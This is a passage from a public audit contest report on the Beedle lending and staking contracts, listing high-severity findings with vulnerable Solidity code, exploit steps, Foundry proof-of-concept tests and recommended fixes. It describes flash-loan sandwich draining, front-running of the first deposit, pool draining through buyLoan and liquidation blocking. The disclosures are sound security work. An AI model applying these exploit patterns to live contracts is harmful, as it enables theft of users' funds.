_Submitted by [Suzombie](https://profiles.cyfrin.io/u/undefined), [HChang26](https://profiles.cyfrin.io/u/undefined), [daciantemp](https://profiles.cyfrin.io/u/undefined), [rvierdiiev](https://profiles.cyfrin.io/u/undefined), [rafaelnicolau](https://profiles.cyfrin.io/u/undefined), [StErMi](https://profiles.cyfrin.io/u/undefined), [patrooney](https://profiles.cyfrin.io/u/undefined), [bauchibred](https://profiles.cyfrin.io/u/undefined), [Phantasmagoria](https://profiles.cyfrin.io/u/undefined), [ptsanev](https://profiles.cyfrin.io/u/undefined), [0xbepresent](https://profiles.cyfrin.io/u/undefined), [toshii](https://profiles.cyfrin.io/u/undefined), [alliums0517](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [ke1cam](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [Niki](https://profiles.cyfrin.io/u/undefined), [sonny2k](https://profiles.cyfrin.io/u/undefined), [LaScaloneta](https://codehawks.cyfrin.io/team/clkgxjy6h0025lc080s97ux79), [0xCiphky](https://profiles.cyfrin.io/u/undefined), [khegeman](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [pengun](https://profiles.cyfrin.io/u/undefined), [lealCodes](https://profiles.cyfrin.io/u/undefined), [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj), [xfu](https://profiles.cyfrin.io/u/undefined), [Madalad](https://profiles.cyfrin.io/u/undefined), [Avci](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [0xswahili](https://profiles.cyfrin.io/u/undefined), [tsvetanovv](https://profiles.cyfrin.io/u/undefined), [0xsmartcontract](https://profiles.cyfrin.io/u/undefined), [thekmj](https://profiles.cyfrin.io/u/undefined), [0xanmol](https://profiles.cyfrin.io/u/undefined), [PTolev](https://profiles.cyfrin.io/u/undefined), [owade](https://profiles.cyfrin.io/u/undefined), [BanditSecurity](https://profiles.cyfrin.io/u/undefined), [Omeguhh](https://profiles.cyfrin.io/u/undefined), [No12Samurai](https://profiles.cyfrin.io/u/undefined), [ohi0b](https://profiles.cyfrin.io/u/undefined), [tsar](https://profiles.cyfrin.io/u/undefined), [gkrastenov](https://profiles.cyfrin.io/u/undefined), [33audits](https://profiles.cyfrin.io/u/undefined), [SA110](https://profiles.cyfrin.io/u/undefined), [kose](https://profiles.cyfrin.io/u/undefined), [ADM](https://profiles.cyfrin.io/u/undefined), [funderbrkrer](https://profiles.cyfrin.io/u/undefined), [ak1](https://profiles.cyfrin.io/u/undefined), [johan](https://profiles.cyfrin.io/u/undefined). Selected submission by: [33audits](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L46

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L38

## Summary

Some ERC20 tokens, such as USDT, allow for charging a fee any time transfer() or transferFrom() is called. If a contract does not allow for amounts to change after transfers, subsequent transfer operations based on the original amount will revert() due to the contract having an insufficient balance. However, a malicious user could also take advantage of this to steal funds from the pool.

## Vulnerability Details

Let's take a look at the `deposit()` and `withdraw()` functions. 


```
    function deposit(uint _amount) external {
        TKN.transferFrom(msg.sender, address(this), _amount);
        updateFor(msg.sender);
        balances[msg.sender] += _amount;
    }
```

```
    /// @notice withdraw tokens from stake
    /// @param _amount the amount to withdraw
    function withdraw(uint _amount) external {
        updateFor(msg.sender);
        balances[msg.sender] -= _amount;
        TKN.transfer(msg.sender, _amount);
    }
```
## Impact
1. Alice sends 100 of FEE token to the contract when calling `addToPool()`.
2. FEE token contract takes 10% of the tokens (10 FEE).
3. 90 FEE tokens actually get deposit in contract.
4. `_updatePoolBalance(poolId, pools[poolId].poolBalance + amount);` will equal 100.
5. Attacker then sends 100 FEE tokens to the contract
6. The contract now has 180 FEE tokens but each user has an accounting of 100 FEE.
6. The attacker then tries to redeem his collateral for the full amount 100 FEE tokens.
7. The contract will transfer 100 FEE tokens to Bob taking 10 of Alice's tokens with him.
8. Bob can then deposit back into the pool and repeat this until he drains all of Alice's funds.
9. When Alice attempts to withdraw the transaction will revert due to insufficient funds.

## Tools Used

Manual review.

## Recommended Steps

Measure the contract balance before and after the call to transfer()/transferFrom() and use the difference between the two as the amount, rather than the amount stated

```
    function deposit(uint _amount) external {
        uint256 balanceBefore = IERC20(TKN).balanceOf(address(this));
        TKN.transferFrom(msg.sender, address(this), _amount);
        uint256 balanceAfter = IERC20(TKN).balanceOf(address(this));
        uint256 amount = balanceBefore - balanceAfter;
        updateFor(msg.sender);
        balances[msg.sender] += amount;
    }
```

Note this implementation is vulnerable to reentrancy so be sure to add a reentrancy guard to this function.


## <a id='H-13'></a>H-13. update() not getting called right after a WETH amount has been sent will cause users to lose staking rewards

_Submitted by [kutu](https://profiles.cyfrin.io/u/undefined), [credence0x](https://profiles.cyfrin.io/u/undefined), [0xanmol](https://profiles.cyfrin.io/u/undefined), [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj), [bernd](https://profiles.cyfrin.io/u/undefined), [jonatascm](https://profiles.cyfrin.io/u/undefined), [pengun](https://profiles.cyfrin.io/u/undefined), [lalanda](https://profiles.cyfrin.io/u/undefined), [KrisApostolov](https://profiles.cyfrin.io/u/undefined). Selected submission by: [KrisApostolov](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L61

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L26

## Summary

Update not getting called right after a WETH reward addition to `Staking.sol` will make old stakers lose a portion of their staked amounts.

## Vulnerability Details

`Staking.sol` relies on a measuring system that factors in how many indexes ago a user has staked. When `update()` gets called after WETH gets added to the system `index` gets updated with an amount that is going to get distributed to each and every user based on how much they have staked. The formula used to determine the multiplier for each user's staked tokens is the following: `amount of new weth * 1e18 / current supply of staking tokens`.

Then based on that multiplier the following calculation gets done for each address when `updateFor()` gets called on it: `amount supplied * the current multiplier amount / 1e18`.

The issue arises due to `update()` on `Staking.sol` not getting called right after WETH gets sent from `Fees.sol`'s `sellProfits()`. The reward calculations only give users the right amount if balances got updated right after WETH being deposited. This opens the door for such cases:

1. WETH gets sent to `Staking.sol`. `update()` doesn't get called.
2. Someone depositing tokens into `Staking.sol`.
3. then WETH getting sent again, right after that update `update()` getting called.

This will make everyone's who deposited before the new depositor get less rewards because the total supply of tokens in the contract being different than when update should have been called.

Here is a PoC demonstrating the issue:

https://gist.github.com/CrisCodesCrap/a312eded3c4b57231af1a1df71f7a3be

## Impact

Stakers, who have staked before the new staker will lose a portion of their tokens due to the offset staking token balance.

## Tools Used

Manual Review

## Recommendations

Consider calling `Staking.sol`'s update in `Fees.sol`'s `sellProfits()`.

```solidity
function sellProfits(address _profits) public {
	...
	IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
	Staking(staking).update();
}
```
## <a id='H-14'></a>H-14. Sandwich attack to steal all ERC-20 tokens in the Fees contract

_Submitted by [Rotcivegaf](https://profiles.cyfrin.io/u/undefined), [lalanda](https://profiles.cyfrin.io/u/undefined), [0xAsen](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [abarbatei](https://profiles.cyfrin.io/u/undefined), [auditism](https://profiles.cyfrin.io/u/undefined), [JohnnyTime](https://profiles.cyfrin.io/u/undefined), [djanerch](https://profiles.cyfrin.io/u/undefined), [0xWeb3boy](https://profiles.cyfrin.io/u/undefined), [LaScaloneta](https://codehawks.cyfrin.io/team/clkgxjy6h0025lc080s97ux79), [Bauer](https://profiles.cyfrin.io/u/undefined), [Arabadzhiev](https://profiles.cyfrin.io/u/undefined), [0xyPhilic](https://profiles.cyfrin.io/u/undefined), [B353N](https://profiles.cyfrin.io/u/undefined), [0xcm](https://profiles.cyfrin.io/u/undefined), [0xdeth](https://profiles.cyfrin.io/u/undefined), [serialcoder](https://profiles.cyfrin.io/u/undefined), [0xaadhi](https://profiles.cyfrin.io/u/undefined). Selected submission by: [serialcoder](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L38-L39

## Summary

The `Fees::sellProfits()` lacks slippage protection, resulting in being attacked by a sandwich attack to drain all locked ERC-20 tokens.

## Vulnerability Details

The `sellProfits()` is a permissionless function that can be called by anyone. The function lacks [slippage protection](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L38-L39) (the parameters `amountOutMinimum` and `sqrtPriceLimitX96` are set to 0) when swapping tokens through Uniswap's pools. 

In this way, an attacker can launch a sandwich attack with a flash loan to drain all ERC-20 tokens (e.g., USDC, DAI, CRV, etc.) locked in the `Fees` contract. 

For instance, to drain all USDC, consider the following proof-of-concept.
1. Attacker borrows a flash loan for USDC and buys WETH from Uniswap's WETH/USDC pool.
2. Attacker executes the `sellProfits(USDC)`.
3. The `sellProfits()` will spend all locked USDC for buying WETH at a very high price.
4. Attacker sells the previously obtained WETH for USDC at the same pool and repays the flash loan.
5. Attacker takes all locked USDC as profit.

Moreover, an attacker can perform steps 1-5 above to steal other ERC-20 tokens locked in the `Fees` contract.

```solidity
    function sellProfits(address _profits) public {
        require(_profits != WETH, "not allowed");
        uint256 amount = IERC20(_profits).balanceOf(address(this));

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: _profits,
                tokenOut: WETH,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amount,
@>              amountOutMinimum: 0,
@>              sqrtPriceLimitX96: 0
            });

        amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
    }
```

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L38-L39

## Impact

An attacker can drain all ERC-20 tokens (e.g., USDC, DAI, CRV, etc.) locked in the `Fees` contract. Therefore, I consider this vulnerability a high-risk issue.

## Tools Used

Manual Review

## Recommendations

I recommend adding the `onlyOwner` modifier and setting the `amountOutMinimum` parameter to protect price slippage from MEV bots. If necessary, specify the `sqrtPriceLimitX96` parameter to set a stop price.
## <a id='H-15'></a>H-15. Token spending by Uniswap router doesn't get approved

_Submitted by [LaScaloneta](https://codehawks.cyfrin.io/team/clkgxjy6h0025lc080s97ux79), [Rotcivegaf](https://profiles.cyfrin.io/u/undefined), [jprod15](https://profiles.cyfrin.io/u/undefined), [credence0x](https://profiles.cyfrin.io/u/undefined), [qckhp](https://profiles.cyfrin.io/u/undefined), [0xumarkhatab](https://profiles.cyfrin.io/u/undefined), [dimulski](https://profiles.cyfrin.io/u/undefined), [Shogoki](https://profiles.cyfrin.io/u/undefined), [1d9f10834c](https://profiles.cyfrin.io/u/undefined), [auditism](https://profiles.cyfrin.io/u/undefined), [nervouspika](https://profiles.cyfrin.io/u/undefined), [trtrth](https://profiles.cyfrin.io/u/undefined), [gss1](https://profiles.cyfrin.io/u/undefined), [jonatascm](https://profiles.cyfrin.io/u/undefined), [0xCiphky](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [y51r](https://profiles.cyfrin.io/u/undefined), [ni8mare](https://profiles.cyfrin.io/u/undefined), [alexzoid](https://profiles.cyfrin.io/u/undefined), [0xyPhilic](https://profiles.cyfrin.io/u/undefined), [smbv1923](https://profiles.cyfrin.io/u/undefined), [honeymewn](https://profiles.cyfrin.io/u/undefined), [Mlome](https://profiles.cyfrin.io/u/undefined), [KrisApostolov](https://profiles.cyfrin.io/u/undefined). Selected submission by: [KrisApostolov](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L26-L44

## Summary

 Tokens do not get approved to be spent by the Uniswap router, which will always make `sellProfits` revert and lock any tokens sent to this contract in the process.

## Vulnerability Details

In `Fees.sol`, `sellProfits` does not approve tokens to be spent by the Uniswap router.  This will cause any call to `sellProfits` to always revert upon calling and will results in all tokens sent to the contract to be locked forever.

```solidity
function sellProfits(address _profits) public {
        require(_profits != WETH, "not allowed");
        uint256 amount = IERC20(_profits).balanceOf(address(this));

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: _profits,
                tokenOut: WETH,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

				// @audit The tokens do not get approved

        amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
    }
```

## Impact

This issue will make any ERC20 tokens sent to be contract to be permanently frozen in the contract, hence the high-severity of this finding.

## Tools Used

Manual Review

## Recommendations

Consider adding something like the following snippet just before to the function to mitigate the issue:

```solidity
IERC20(_profits).approve(address(swapRouter), IERC20(_profits).balanceOf(address(this)))
```

Also, consider making the contract take the tokens out of the user upon calling so that even if something else makes the execution fail the funds will still be in the user's balance.
## <a id='H-16'></a>H-16. Front-runnig the first deposit on stake yealds the whole WETH amount

_Submitted by [pyro](https://profiles.cyfrin.io/u/undefined), [lalanda](https://profiles.cyfrin.io/u/undefined). Selected submission by: [pyro](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L88

## Summary
By inserting a transaction between the deployment of [staking](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L88) and depositing of the first amount of  WETH you can steal this whole amount.

## Vulnerability Details
Lets say Beedle has been active for some time and the owners have collected some fees. They decide to deploy staking and but 1 WETH inside of it as the initial deposit. After sending their TX for deployment and before the TX for sending WETH, an attacker can would be able to insert his own TX
in the middle of them to. He would just need to deposit any amount of TNK (it could be as little as 1 wei). adn when the WETH is send he can call [claim](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L53-L58) and claim 100% of it.

Example
1. Owners deploy the contract and afterwards send 1 WETH to it, as staking incentives
2. Attacker sees that so he inserts his [deposit](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L38-L42) TX of 1 wei between these 2 and boost the 3 TX with Flashbots (for he to be sure they will execute in this order) 

Now after the deposit [update](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L61-L76) and [updateFor](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L80-L94). Where on update the index will be 0, since the [2 balances](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L65) will be equal.
```jsx
            uint256 _balance = WETH.balanceOf(address(this));//@audit this is 0
            if (_balance > balance) {// if (0 > ?) => false
``` 
Because index is 0 [updateFor](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L92) will set the attacker index as 0 also.

3. After 1 WETH is send the attacker just calls [claim](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L53-L58) where [update](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L66-L73) will trigger and the global index will become 1e36.

```jsx
            uint256 _balance = WETH.balanceOf(address(this));
            if (_balance > balance) {
                uint256 _diff = _balance - balance;
                if (_diff > 0) {
                    //@audit 1e18 * 1e18 / 1 => 1e36
                    uint256 _ratio = _diff * 1e18 / totalSupply; 
                    if (_ratio > 0) {
                      index = index + _ratio;
                      balance = _balance;
                    }
                }
```
From there on his share [would increase](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L88-L89) to 1e18, and claim will [send it](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L55).

## Impact
Attacker would be able to steal 100% of the initial deposit with amount of TKN as low as 1 wei.

## Tools Used
Manual review and Echidna 2.0

## Recommendations
You can inprove on the math fro calculating and updating the rewards, or after deployment make sure there are a lot of staked users and then send the WETH. 
## <a id='H-17'></a>H-17. Rewards can be sabotaged by large deposit and withdraw

_Submitted by [ptsanev](https://profiles.cyfrin.io/u/undefined), [pyro](https://profiles.cyfrin.io/u/undefined), [BanditSecurity](https://profiles.cyfrin.io/u/undefined), [abarbatei](https://profiles.cyfrin.io/u/undefined), [0xanmol](https://profiles.cyfrin.io/u/undefined), [pep7siup](https://profiles.cyfrin.io/u/undefined), [hasanza](https://profiles.cyfrin.io/u/undefined), [ubermensch](https://profiles.cyfrin.io/u/undefined), [KrisApostolov](https://profiles.cyfrin.io/u/undefined). Selected submission by: [BanditSecurity](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L53-L58

## Summary

The rewards in the Staking contract are calculated based on the change in WETH and the amount of staked TKN at the exact time of withdrawal, regardless of how long the TKN has been staked. By sandwiching a claim() between a large deposit or withdraw, an attacker can reduce the amount of reward tokens a withdrawer gets. This attack costs them zero tokens, as in the TKN in == TKN out. They could profit from this if they already have a large amount of tokens staked, because these unrewarded tokens will get distributed to future claimants of rewards.

## Vulnerability Details

Here is a POC of the attack. There is a base case, where somebody deposits, then claims some ETH rewards.
The "attack case" is a replica of the base case, except the withdrawal transaction is sandwiched between the attacker's deposit and withdraw.
 

We use console.log() to log the amount claimed. In the base case, 400 WETH is claimed and in the attack case, the victim only claimed 15 WETH, so the attack successfully reduced the reward amount.

Since the attacker staked 10000 and immediately withdrew 10000, the attack cost them 0 TKN.

```solidity

contract StakingTest is Test {
    Staking staking;
    WETH9 weth;
    TKN tkn; 

    //users:
    //This contract is owner
    address attacker = address(1);
    address bob = address(2);
    address test_address = address(this);

    function setUp() public {
        weth = new WETH9();
        tkn = new TKN();
        staking = new Staking(address(tkn), address(weth));

        //get 1000WETH
        weth.deposit{value: 1000000}();
        weth.transfer(address(staking), 1000);

        tkn.transfer(attacker, 1000);
        tkn.transfer(bob, 1000);

    }

    function test_POC_sabotage_rewards_attack_case() public {
        
        console.log(weth.balanceOf(address(staking)), "initial weth balance");

        tkn.approve(address(staking), 1e30);
        staking.deposit(200);

        vm.startPrank(bob);
        tkn.approve(address(staking), 1000);
        staking.deposit(100);
        staking.deposit(100);
        vm.stopPrank();


        weth.transfer(address(staking), 800);
        
        staking.deposit(10000);

        vm.startPrank(bob);
        uint balance_before = weth.balanceOf(bob);
        staking.claim();
        uint balance_after = weth.balanceOf(bob);
        console.log(balance_after- balance_before, "claimed");
        vm.stopPrank();

        staking.withdraw(10000);
    }

    function test_POC_sabotage_rewards_base_case() public {
        
        console.log(weth.balanceOf(address(staking)), "initial weth balance");

        tkn.approve(address(staking), 1e30);
        staking.deposit(200);

        vm.startPrank(bob);
        tkn.approve(address(staking), 1000);
        staking.deposit(100);
        staking.deposit(100);
        vm.stopPrank();


        weth.transfer(address(staking), 800);
        

        vm.startPrank(bob);
        uint balance_before = weth.balanceOf(bob);
        staking.claim();
        uint balance_after = weth.balanceOf(bob);
        console.log(balance_after- balance_before, "claimed");
        vm.stopPrank();

    }
}
```

```
[PASS] test_POC_sabotage_rewards_attack_case() (gas: 359582)
Logs:
  1000 initial weth balance
  15 claimed

[PASS] test_POC_sabotage_rewards_base_case() (gas: 319598)
Logs:
  1000 initial weth balance
  400 claimed
```


## Impact

Innocent stakers can have their rewards slashed/sabotaged by flash deposit/withdraws

## Tools Used

Foundry

## Recommendations

Give a time delay between deposits and withdrawals.
## <a id='H-18'></a>H-18. Borrower can prevent his/her loan from being liquidated

_Submitted by [daciantemp](https://profiles.cyfrin.io/u/undefined), [sonny2k](https://profiles.cyfrin.io/u/undefined). Selected submission by: [sonny2k](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
During the Dutch Auction, the borrower can keep calling [buyLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L465) with the `loanId` is his/her loan and `poolId` is the same pool which the loan was borrowed from so that the `loan.auctionStartTimestamp` will be set to the default value of `type(uint256).max`. This makes the loan always immature to be seized as [seizeLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L554-L555) will revert if `loan.auctionStartTimestamp == type(uint256).max`.

## Vulnerability Details
The borrower first needs to calculate the timeElapsed which is responsible for rate validation of the pool:
https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L474-L478
```
473     // calculate the current interest rate
474     uint256 timeElapsed = block.timestamp - loan.auctionStartTimestamp;
475     uint256 currentAuctionRate = (MAX_INTEREST_RATE * timeElapsed) /
476         loan.auctionLength;
477     // validate the rate
478     if (pools[poolId].interestRate > currentAuctionRate) revert RateTooHigh();
```

Then he/she can decide when to buy the loan after the original lender have started the auction for this loan so that it can satisfy the rate validation. After being successfully bought with the same poolId, the loan.auctionStartTimestamp's value will be set to default as you can see here: https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L521
```
521     loans[loanId].auctionStartTimestamp = type(uint256).max;
```
## POC
Copy this test case into test/Lender.t.sol
```
function test_buyLoanWithTheSamePool() public {
        test_borrow();
        // accrue interest
        vm.warp(block.timestamp + 364 days + 12 hours);
        // kick off auction
        vm.startPrank(lender1);

        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;

        lender.startAuction(loanIds);

        bytes32[] memory poolIds = new bytes32[](1);
        poolIds[0] = keccak256(
            abi.encode(
                address(lender1),
                address(loanToken),
                address(collateralToken)
            )
        );

        // warp to middle of auction
        vm.warp(block.timestamp + 23 hours + 59 minutes);

        vm.startPrank(borrower);

        lender.buyLoan(0, poolIds[0]);

        (, , , , , , , , uint256 auctionStartTimestamp, ) = lender.loans(0);

        assertEq(auctionStartTimestamp, type(uint256).max);

        vm.startPrank(lender1);

        // Lender1 can't seize the loan anymore because it has been rebought to the same pool before auction ended
        lender.seizeLoan(loanIds);
}

```
Use `forge test --mt test_buyLoanWithTheSamePool` to run this test case.

In this POC the borrower waits until there is one minutes left before the auction ending (23 hours 59 minutes, the `loan.auctionLength` is 1 days) and calls `buyLoan()`, after the action the lender1 cannot seize the loan anymore.

## Impact
If the borrower observes that there is no pool that has the same config of the old pool and has enough balance to buy his/her loan when it come to an end of the auction, he/she can use this workaround to avoid liquidation of the loan. The lender also loses his time waiting for the auction to end but can't seize the loan to get the collateral assets although no one actually buying the loan, the loan is just re-bought itself from the same pool, which is not the lender's original intention.

## Tools Used
Manual

## Recommendations
1. Implement a validation that the new pool buying the loan is not the same pool which the loan is from.

Put the code below this line: https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L493
```diff
+         // validate if the same pool is used to buy
+         if (oldPoolId == poolId) revert DeclareANewErrorForThis();
```
## <a id='H-19'></a>H-19. A pool lender can fully drain another user's pool by abusing `buyLoan`

_Submitted by [sonny2k](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [vangrim](https://profiles.cyfrin.io/u/undefined), [qckhp](https://profiles.cyfrin.io/u/undefined), [1nc0gn170](https://profiles.cyfrin.io/u/undefined), [0x11singh99](https://profiles.cyfrin.io/u/undefined). Selected submission by: [deadrosesxyz](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L465

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L465

## Summary
A pool lender can fully drain another user's pool by abusing `buyLoan` function. 

## Vulnerability Details
Upon buying a loan, all a `pool.lender` passes as arguments in the function is the id of the loan they want to buy. This could be problematic as the loan could be subject to heavy changes.
Consider the following scenario: 
1. User A creates a pool with max interest rate. 
2. From another wallet, the same user takes a borrow for 1000 USDC and gives 3000 USDT as collateral
3. User A calls `startAuction` for this loan
4. User B sees the loan on auction and since it has high interest rate and is well-collateralized, decides to buy it.
5. User B calls `buyLoan` and passes to corresponding `loanId`.
6. User A sees the pending transaction and front-runs it and changes his `pool.maxLoanRatio` to `type(uint256).max` (basically allowing for loans not sufficiently backed up by collateral)
7. After changing the `maxLoanRatio`, user A calls `refinance` and sets the loan debt to user B's pool balance and changes the collateral to 1 USDT.
8. After doing so, user A changes `maxLoanRatio` back to its original value and once again calls `startAuction` with the same `loanId`. 
9. Considering steps 6-8 all executed before user B's `buyLoan`, user B's call now executes and they've bought a borrow for all of their pool balance, backed up by pretty much no collateral. 
10. User A successfully executed the attack and has now taken a huge borrow which they have no incentive to repay as there isn't any valuable collateral attached to it.
11. User A can then either withdraw their funds from their pool or repeat the attack.


## Impact
Pool lender can drain other pools. 

## Tools Used
Manual review

## Recommendations
Add the following check to `buyLoan` 
```solidity
            if (loanRatio > pool.maxLoanRatio) revert RatioTooHigh();
```
## <a id='H-20'></a>H-20. `Lender` does not handle correctly rebasing, inflationary, deflationary tokens and tokens with fee on transfer

_Submitted by [Suzombie](https://profiles.cyfrin.io/u/undefined), [StErMi](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [0xsmartcontract](https://profiles.cyfrin.io/u/undefined), [PTolev](https://profiles.cyfrin.io/u/undefined), [Omeguhh](https://profiles.cyfrin.io/u/undefined), [ubermensch](https://profiles.cyfrin.io/u/undefined), [33audits](https://profiles.cyfrin.io/u/undefined), [SA110](https://profiles.cyfrin.io/u/undefined), [alra](https://profiles.cyfrin.io/u/undefined), [kose](https://profiles.cyfrin.io/u/undefined). Selected submission by: [StErMi](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol

## Summary

The current implementation of the `Lender` contract does not handle these kinds of tokens:
- Rebasing tokens
- Inflationary tokens
- Deflationary tokens
- Tokens with fee-on-transfer

The accounting variables on the `Loan` and `Pool` structs will store an incorrect value that could lead to reverts or further accounting errors.

## Vulnerability Details

The current implementation of the `Lender` contract does not handle these kinds of tokens:
- Rebasing tokens
- Inflationary tokens
- Deflationary tokens
- Tokens with fee-on-transfer

The accounting variables on the `Loan` and `Pool` structs will store an incorrect value that could lead to reverts or further accounting errors.

## Impact

All the following accounting variables will store the incorrect amount of tokens:
- `loan.debt`
- `loan.collateral`
- `pool.poolBalance`
- `pool.outstandingLoans`

The accounting variables on the `Loan` and `Pool` structs will store an incorrect value that could lead to reverts or further accounting errors.

## Tools Used

Manual + foundry test

### `BaseLender.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Lender.sol";

import {ERC20} from "solady/src/tokens/ERC20.sol";

contract TERC20 is ERC20 {

    function name() public pure override returns (string memory) {
        return "Test ERC20";
    }

    function symbol() public pure override returns (string memory) {
        return "TERC20";
    }

    function mint(address _to, uint256 _amount) public {
        _mint(_to, _amount);
    }
}

contract WrappedLender is Lender {
    
    function getLoanDebtDetail(uint256 loanId) external view returns (uint256 fullDebt, uint256 interest, uint256 fees) {
        Loan memory loan = loans[loanId];
        // calculate the accrued interest
        (interest, fees) = _calculateInterest(loan);
        fullDebt = loan.debt + interest + fees;
    }

    function getPoolInfo(bytes32 poolId) external view returns (Pool memory) {
        return pools[poolId];
    }

    function getLoanInfo(uint256 loanId) external view returns (Loan memory) {
        return loans[loanId];
    }
}

contract BaseLender is Test {
    WrappedLender public lender;

    TERC20 public loanToken;
    TERC20 public collateralToken;

    address public lender1 = address(0x1);
    address public lender2 = address(0x2);
    address public borrower = address(0x3);
    address public fees = address(0x4);

    function setUp() public virtual {
        lender = new WrappedLender();
        loanToken = new TERC20();
        collateralToken = new TERC20();

        loanToken.mint(address(lender1), 100000 ether);
        loanToken.mint(address(lender2), 100000 ether);
        collateralToken.mint(address(borrower), 100000 ether);

        vm.startPrank(lender1);
        loanToken.approve(address(lender), 1000000 ether);
        collateralToken.approve(address(lender), 1000000 ether);

        vm.startPrank(lender2);
        loanToken.approve(address(lender), 1000000 ether);
        collateralToken.approve(address(lender), 1000000 ether);

        vm.startPrank(borrower);
        loanToken.approve(address(lender), 1000000 ether);
        collateralToken.approve(address(lender), 1000000 ether);
    }


    function borrow(address _borrower, bytes32 poolId) public {
        vm.startPrank(_borrower);
        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 100 ether,
            collateral: 100 ether
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;
        lender.borrow(borrows);
        vm.stopPrank();
    }

    function createPool(address _lender) public returns (bytes32){
        vm.startPrank(_lender);
        Pool memory p = Pool({
            lender: _lender,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 ether,
            poolBalance: 1000 ether,
            maxLoanRatio: 2 ether,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(p);
        vm.stopPrank();

        return poolId;
    }

    function startAuction(address _lender, uint256 loanId) public {
        uint256[] memory loans = new uint256[](1);
        loans[0] = loanId;

        vm.prank(_lender);
        lender.startAuction(loans);
    }

    function seizeLoan(uint256 loanId) public {
        uint256[] memory loans = new uint256[](1);
        loans[0] = loanId;
        lender.seizeLoan(loans);
    }

    function getPoolId(address _lender) public returns (bytes32) {
        return keccak256(
            abi.encode(
                address(_lender),
                address(loanToken),
                address(collateralToken)
            )
